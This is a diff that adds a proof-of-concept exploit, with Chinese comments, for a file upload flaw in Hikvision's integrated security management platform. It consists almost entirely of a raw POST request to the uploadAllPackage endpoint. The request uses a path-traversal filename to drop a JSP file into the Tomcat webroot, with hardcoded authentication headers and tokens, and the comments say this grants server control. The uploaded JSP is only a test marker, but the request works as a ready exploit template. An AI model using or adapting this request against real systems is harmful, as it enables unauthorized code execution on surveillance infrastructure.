@@ -1,0 +1,18 @@
+# HIKVISION综合安防管理平台uploadAllPackage文件上传漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 综合安防管理平台存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限。
+POST /center_install/picUploadService/v1/uploadAllPackage/image?acid=80051734&bid=hd_tag_m8mv264v HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv264v
+RM-PRO-Token: 52935b239b137c8a301afc7cd658168f
+RM-PRO-Time: 1742808546628
+User-Agent: curl/7.83.1
+Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+
+----------------------------553898708333958420021355
+Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/y4.jsp"
+Content-Type: application/octet-stream
+
+<%out.print("test3");%>
+----------------------------553898708333958420021355--
